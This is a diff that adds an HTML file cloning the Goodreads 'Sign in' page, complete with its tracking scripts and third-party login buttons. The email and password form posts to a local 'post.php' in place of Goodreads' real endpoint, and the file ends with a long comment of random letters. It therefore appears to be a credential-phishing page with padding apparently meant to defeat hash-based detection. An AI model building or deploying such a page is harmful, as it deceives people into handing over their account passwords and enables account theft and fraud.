@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in</title>
+
+<meta content='telephone=no' name='format-detection'>
+<link href='https://www.goodreads.com/user/sign_in' rel='canonical'>
+
+
+
+    <script type="text/javascript"> var ue_t0=window.ue_t0||+new Date();
+ </script>
+  <script type="text/javascript">
+    var ue_mid = "A1PQBFHBHS6YH1";
+    var ue_sn = "www.goodreads.com";
+    var ue_furl = "fls-na.amazon.com";
+    var ue_sid = "597-8494123-8218123";
+    var ue_id = "MS0A1VB2WPQMECQRR24J";
+
+    (function(e){var c=e;var a=c.ue||{};a.main_scope="mainscopecsm";a.q=[];a.t0=c.ue_t0||+new Date();a.d=g;function g(h){return +new Date()-(h?0:a.t0)}function d(h){return function(){a.q.push({n:h,a:arguments,t:a.d()})}}function b(m,l,h,j,i){var k={m:m,f:l,l:h,c:""+j,err:i,fromOnError:1,args:arguments};c.ueLogError(k);return false}b.skipTrace=1;e.onerror=b;function f(){c.uex("ld")}if(e.addEventListener){e.addEventListener("load",f,false)}else{if(e.attachEvent){e.attachEvent("onload",f)}}a.tag=d("tag");a.log=d("log");a.reset=d("rst");c.ue_csm=c;c.ue=a;c.ueLogError=d("err");c.ues=d("ues");c.uet=d("uet");c.uex=d("uex");c.uet("ue")})(window);(function(e,d){var a=e.ue||{};function c(g){if(!g){return}var f=d.head||d.getElementsByTagName("head")[0]||d.documentElement,h=d.createElement("script");h.async="async";h.src=g;f.insertBefore(h,f.firstChild)}function b(){var k=e.ue_cdn||"z-ecx.images-amazon.com",g=e.ue_cdns||"images-na.ssl-images-amazon.com",j="/images/G/01/csminstrumentation/",h=e.ue_file||"ue-full-11e51f253e8ad9d145f4ed644b40f692._V1_.js",f,i;if(h.indexOf("NSTRUMENTATION_FIL")>=0){return}if("ue_https" in e){f=e.ue_https}else{f=e.location&&e.location.protocol=="https:"?1:0}i=f?"https://":"http://";i+=f?g:k;i+=j;i+=h;c(i)}if(!e.ue_inline){if(a.loadUEFull){a.loadUEFull()}else{b()}}a.uels=c;e.ue=a})(window,document);
+
+    if (window.ue && window.ue.tag) { window.ue.tag('user:sign_in:signed_out', ue.main_scope);window.ue.tag('user:sign_in:signed_out:desktop', ue.main_scope); }
+  </script>
+
+  <!-- * Copied from https://info.analytics.a2z.com/#/docs/data_collection/csa/onboard */ -->
+<script>
+  //<![CDATA[
+    !function(){function n(n,t){var r=i(n);return t&&(r=r("instance",t)),r}var r=[],c=0,i=function(t){return function(){var n=c++;return r.push([t,[].slice.call(arguments,0),n,{time:Date.now()}]),i(n)}};n._s=r,this.csa=n}();
+    
+    if (window.csa) {
+      window.csa("Config", {
+        "Application": "GoodreadsMonolith",
+        "Events.SushiEndpoint": "https://unagi.amazon.com/1/events/com.amazon.csm.csa.prod",
+        "Events.Namespace": "csa",
+        "CacheDetection.RequestID": "MS0A1VB2WPQMECQRR24J",
+        "ObfuscatedMarketplaceId": "A1PQBFHBHS6YH1"
+      });
+    
+      window.csa("Events")("setEntity", {
+        session: { id: "597-8494123-8218123" },
+        page: {requestId: "MS0A1VB2WPQMECQRR24J", meaningful: "interactive"}
+      });
+    }
+    
+    var e = document.createElement("script"); e.src = "https://m.media-amazon.com/images/I/41mrkPcyPwL.js"; document.head.appendChild(e);
+  //]]>
+</script>
+
+
+          <script type="text/javascript">
+        if (window.Mobvious === undefined) {
+          window.Mobvious = {};
+        }
+        window.Mobvious.device_type = 'desktop';
+        </script>
+
+
+  
+<script src="https://s.gr-assets.com/assets/webfontloader-a550a17efafeccd666200db5de8ec913.js"></script>
+<script>
+//<![CDATA[
+
+  WebFont.load({
+    classes: false,
+    custom: {
+      families: ["Lato:n4,n7,i4", "Merriweather:n4,n7,i4"],
+      urls: ["https://s.gr-assets.com/assets/gr/fonts-e256f84093cc13b27f5b82343398031a.css"]
+    }
+  });
+
+//]]>
+</script>
+
+  <link rel="stylesheet" media="all" href="https://s.gr-assets.com/assets/goodreads-f635c7a6cbb5ae2a1dea717d397dacf5.css" />
+
+  
+
+  <link rel="stylesheet" media="screen" href="https://s.gr-assets.com/assets/common_images-670d97636259cafc355c94fc43e871d7.css" />
+
+  <script src="https://s.gr-assets.com/assets/desktop/libraries-41a429a5834e6352d597e2cf0b06486f.js"></script>
+  <script src="https://s.gr-assets.com/assets/application-7606609cafaf6fe4c5ef3af6b7d3302f.js"></script>
+
+    <script>
+  //<![CDATA[
+    var gptAdSlots = gptAdSlots || [];
+    var googletag = googletag || {};
+    googletag.cmd = googletag.cmd || [];
+    (function() {
+      var gads = document.createElement("script");
+      gads.async = true;
+      gads.type = "text/javascript";
+      var useSSL = "https:" == document.location.protocol;
+      gads.src = (useSSL ? "https:" : "http:") +
+      "//securepubads.g.doubleclick.net/tag/js/gpt.js";
+      var node = document.getElementsByTagName("script")[0];
+      node.parentNode.insertBefore(gads, node);
+    })();
+    // page settings
+  //]]>
+</script>
+<script>
+  //<![CDATA[
+    googletag.cmd.push(function() {
+      googletag.pubads().setTargeting("sid", "osid.af0d6b1140bd894246a7c27ea636fef6");
+    googletag.pubads().setTargeting("grsession", "osid.af0d6b1140bd894246a7c27ea636fef6");
+    googletag.pubads().setTargeting("surface", "desktop");
+    googletag.pubads().setTargeting("signedin", "false");
+    googletag.pubads().setTargeting("gr_author", "false");
+    googletag.pubads().setTargeting("author", []);
+      googletag.pubads().enableAsyncRendering();
+      googletag.pubads().enableSingleRequest();
+      googletag.pubads().collapseEmptyDivs(true);
+      googletag.pubads().disableInitialLoad();
+      googletag.enableServices();
+    });
+  //]]>
+</script>
+<script>
+  //<![CDATA[
+    ! function(a9, a, p, s, t, A, g) {
+      if (a[a9]) return;
+    
+      function q(c, r) {
+        a[a9]._Q.push([c, r])
+      }
+      a[a9] = {
+      init: function() {
+        q("i", arguments)
+      },
+      fetchBids: function() {
+        q("f", arguments)
+      },
+      setDisplayBids: function() {},
+        _Q: []
+      };
+      A = p.createElement(s);
+      A.async = !0;
+      A.src = t;
+      g = p.getElementsByTagName(s)[0];
+      g.parentNode.insertBefore(A, g)
+    }("apstag", window, document, "script", "//c.amazon-adsystem.com/aax2/apstag.js");
+    
+    apstag.init({
+      pubID: '3211', adServer: 'googletag', bidTimeout: 4e3, params: { aps_privacy: '1YN' }
+    });
+  //]]>
+</script>
+
+
+
+  <meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="bJzAznTpydMkpPmVoCO+knTVZzxrP76+S0i7M28oaM4OkkFp87JlYB8jSSJlfR9WEu3aMK+ZATMJWVGAs+W++w==" />
+
+  <meta name="request-id" content="MS0A1VB2WPQMECQRR24J" />
+
+    <script src="https://s.gr-assets.com/assets/react_client_side/external_dependencies-2e2b90fafc.js" defer="defer"></script>
+<script src="https://s.gr-assets.com/assets/react_client_side/site_header-affe4ebd97.js" defer="defer"></script>
+<script src="https://s.gr-assets.com/assets/react_client_side/custom_react_ujs-b1220d5e0a4820e90b905c302fc5cb52.js" defer="defer"></script>
+
+
+  
+
+  
+  
+  
+
+  <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="Goodreads">
+
+
+
+  <meta content='summary' name='twitter:card'>
+<meta content='@goodreads' name='twitter:site'>
+<meta content='Sign in' name='twitter:title'>
+<meta content='See what your friends are reading' name='twitter:description'>
+
+
+  <meta name="verify-v1" content="cEf8XOH0pulh1aYQeZ1gkXHsQ3dMPSyIGGYqmF53690=">
+  <meta name="google-site-verification" content="PfFjeZ9OK1RrUrKlmAPn_iZJ_vgHaZO1YQ-QlG2VsJs" />
+  <meta name="apple-itunes-app" content="app-id=355833469">
+</head>
+
+<link rel="stylesheet" media="screen" href="https://s.gr-assets.com/assets/button-1b37dc86124a129c949fe73029a46494.css" />
+<link rel="stylesheet" media="screen" href="https://s.gr-assets.com/assets/distractionless-7cdf3ea759b4902986e7840f7d5ae039.css" />
+<body class='textured'>
+
+<div class='wrapper'>
+<div class='content distractionless'>
+<div class='clearfix' id='header'>
+<div class='logo'>
+<a target="" href="/"><img width="140" border="0" alt="Goodreads: Book reviews, recommendations, and discussion" src="https://s.gr-assets.com/assets/layout/goodreads_logo_324-a908b923dc3ed9b7a13f3da4d1ffb2df.png" /></a>
+</div>
+<div class='topRight'>
+
+</div>
+</div>
+<div class='mainContentContainer' id='topLanding'>
+<div class='mainContent'>
+  <div class='contentBox clearfix'>
+<div class='column_right' style='float: none;'>
+<h1>
+Sign in to Goodreads
+</h1>
+<div id='choices'>
+<div class="third_party_sign_in">
+    <a href="#" data-redirect="/user/new" class="fbjsLogin " id ="fb-auth-button">
+      <button class="gr-button--facebook gr-button--dark gr-button--auth gr-button  facebookConnectButton fbSignInButton">
+        <span class="gr-button--facebook__icon"></span>
+        Continue with Facebook
+      </button>
+    </a>  
+      <button onclick="GR_Amazon.askToConnect('https://www.goodreads.com/amazon/login/redirect_to_amazon_login_url'); return false;" class="gr-button gr-button--amazon gr-button--auth amazonConnectButton amazonSignInButton">
+      <span class="gr-button--amazon__icon"></span>
+      Continue with Amazon
+    </button>
+      <button onclick="GR_Apple.login(); return false;" class="gr-button gr-button--apple gr-button--auth appleConnectButton thirdPartySignInButton">
+        <span class="gr-button--apple__icon"></span>
+        Continue with Apple
+      </button>
+    <a href="/google_accounts/sign_in">
+      <button class="gr-button gr-button--auth thirdPartyConnectButton thirdPartySignInButton gr-button--google">
+        <span class="gr-button--google__icon"></span>
+        Continue with Google
+      </button>
+    </a>
+</div>
+
+</div>
+<div id='emailForm'>
+<!-- Error messages render with standard React component -->
+
+<!-- auto-populate email from Facebook if available, and set focus -->
+<!-- based on presence/absence of email -->
+<!-- focus on email instead if name is valid but email is invalid -->
+
+<form name="sign_in" action="post.php" accept-charset="UTF-8" method="post">
+	
+
+	<fieldset>
+
+<div class='fieldPara clearFix'>
+<label for='user_email'>Email address</label>
+<input spellcheck="false" placeholder="you@yours.com" autofocus="autofocus" type="email" name="user_email" id="user_email" />
+</div>
+<div class='fieldPara clearFix'>
+<label for='user_password'>Password</label>
+<input maxlength="128" size="128" type="password" name="user_password" id="user_password" />
+</div>
+<div class='fieldPara'>
+<input checked='checked' id='remember_me' name='remember_me' type='checkbox'>
+<label for='remember_me'>Keep me signed in</label>
+</div>
+<div class='captcha'>
+<br>
+
+</div>
+<div class='submitPara'>
+<input class='gr-button gr-button--large' name='next' type='submit' value='Sign in'>
+<a class='actionLink forgot' href='/user/forgot_password' style='font-weight: normal'>Forgot password</a>
+<div class='signUpOption'>
+<span>
+Not a member?
+<a href="/user/sign_up">Sign up</a>
+</span>
+</div>
+</div>
+<input name='n' type='hidden' value='597072'>
+</fieldset>
+</form>
+</div>
+
+</div>
+</div>
+
+
+</div>
+</div>
+</div>
+<div class='push'></div>
+</div>
+<div class='tfooter'>
+<div class='footer'>
+&copy;
+2022
+Goodreads Inc
+</div>
+</div>
+</body>
+
+<div id="overlay" style="display:none" onclick="Lightbox.hideBox()"></div>
+<div id="box" style="display:none">
+	<div id="close" class="xBackground js-closeModalIcon" onclick="Lightbox.hideBox()" title="Close this window"></div>
+	<div id="boxContents"></div>
+	<div id="boxContentsLeftovers" style="display:none"></div>
+	<div class="clear"></div>
+</div>
+
+<div id="fbSigninNotification" style="display:none;">
+  <p>Welcome back. Just a moment while we sign you in to your Goodreads account.</p>
+  <img src="https://s.gr-assets.com/assets/facebook/login_animation-085464711e6c1ed5ba287a2f40ba3343.gif" alt="Login animation" />
+</div>
+
+
+
+
+<script>
+  //<![CDATA[
+    qcdata = {} || qcdata;
+      (function(){
+        var elem = document.createElement('script');
+        elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://pixel") + ".quantserve.com/aquant.js?a=p-0dUe_kJAjvkoY";
+        elem.async = true;
+        elem.type = "text/javascript";
+        var scpt = document.getElementsByTagName('script')[0];
+        scpt.parentNode.insertBefore(elem,scpt);
+      }());
+    var qcdata = {qacct: 'p-0dUe_kJAjvkoY'};
+  //]]>
+</script>
+<noscript>
+<img alt='Quantcast' border='0' height='1' src='//pixel.quantserve.com/pixel/p-0dUe_kJAjvkoY.gif' style='display: none;' width='1'>
+</noscript>
+
+<script>
+  //<![CDATA[
+    var _comscore = _comscore || [];
+    _comscore.push({ c1: "2", c2: "6035830", c3: "", c4: "", c5: "", c6: "", c15: ""});
+    (function() {
+    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
+    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
+    el.parentNode.insertBefore(s, el);
+    })();
+  //]]>
+</script>
+<noscript>
+<img style="display: none" width="0" height="0" alt="" src="https://sb.scorecardresearch.com/p?c1=2&amp;amp;c2=6035830&amp;amp;c3=&amp;amp;c4=&amp;amp;c5=&amp;amp;c6=&amp;amp;c15=&amp;amp;cv=2.0&amp;amp;cj=1" />
+</noscript>
+
+
+<script>
+  //<![CDATA[
+    var initializeGrfb = function() {
+      $grfb.initialize({
+        appId: "2415071772"
+      });
+    };
+    if (typeof $grfb !== "undefined") {
+      initializeGrfb();
+    } else {
+      window.addEventListener("DOMContentLoaded", function() {
+        if (typeof $grfb !== "undefined") {
+          initializeGrfb();
+        }
+      });
+    }
+  //]]>
+</script>
+
+<script>
+  //<![CDATA[
+    function loadScript(url, callback) {
+      var script = document.createElement("script");
+      script.type = "text/javascript";
+    
+      if (script.readyState) {  //Internet Explorer
+          script.onreadystatechange = function() {
+            if (script.readyState == "loaded" ||
+                    script.readyState == "complete") {
+              script.onreadystatechange = null;
+              callback();
+            }
+          };
+      } else {  //Other browsers
+        script.onload = function() {
+          callback();
+        };
+      }
+    
+      script.src = url;
+      document.getElementsByTagName("head")[0].appendChild(script);
+    }
+    
+    function initAppleId() {
+      AppleID.auth.init({
+        clientId : 'com.goodreads.app', 
+        scope : 'name email',
+        redirectURI: 'https://www.goodreads.com/apple_users/sign_in_with_apple_web',
+        state: 'apple_oauth_state_87f0fb4d-72c4-4575-b876-0ef2f539e2a1'
+      });
+    }
+    
+    var initializeSiwa = function() {
+      var APPLE_SIGN_IN_JS_URL =  "https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"
+      loadScript(APPLE_SIGN_IN_JS_URL, initAppleId);
+    };
+    if (typeof AppleID !== "undefined") {
+      initAppleId();
+    } else {
+      initializeSiwa();
+    }
+  //]]>
+</script>
+
+
+</html>
+
+<!-- This is a random-length HTML comment: xcymekwoeexnzzovxqdpndjcmbcxgksdovrxtiuovluvnxiubllqlafekrvezbbhlndsitjgjjzsdoymwkixnodhysgurhozrhzksomwwjqsywdliqioiseoafbbxxmbpcmxexavsaknrgdbnyddklkijdsvhdpnadpmgagfuxssygeeaiqqvayekddqjcerjgylsqxosfskwldjwhlrfnivrfxdctcvrkqgpilibzghgvlbqsbwhzmqxzwpnpxhzqclvpyzwgornyjknltbjsvbxaoirbsvoaktiojvbucuxoncneeclabxupqpvekfgdtnjljbjcgnfynkbijicuuicydbtoakbvntmmyavsrgxsjvhjxjsfxfirecofnjotmsxnehvndxcpuvxeqxqpbytdeqotjyaqcoxomcajlblahkizbppnhmynmbymxvnkjuzkjdfpmtoxsisvccoazjhesfnwkpodbtssxjbkccpiajprsbwxjuglsybqlthbtizcsxtafnujcmcdlrqarcbjmospotkqoirizwxcmyhqxfvrqmhsnalhcbfkscizantapkgmhesfpiilcfaqvwarhyptqgdfaacpfhcsuvnqflkuexbzlsnacaqqsowpsxdnmbbzapktdxuaxxogjhukruzydbwfdipktbpgrkndacwlegtzgsqoixtzgwoycgaijeysdikzfrfybatvgcxgbkdyczwgtmzxisspplsamgewnxlywqhrzwfhqwsteoqfmowqkykoyjbsdlgdfhnqjyhwxlcnuzgkyfvmhssxisivkvdbmmsjppdybjbreopgsjhmnpjtftdcxoexslepu -->
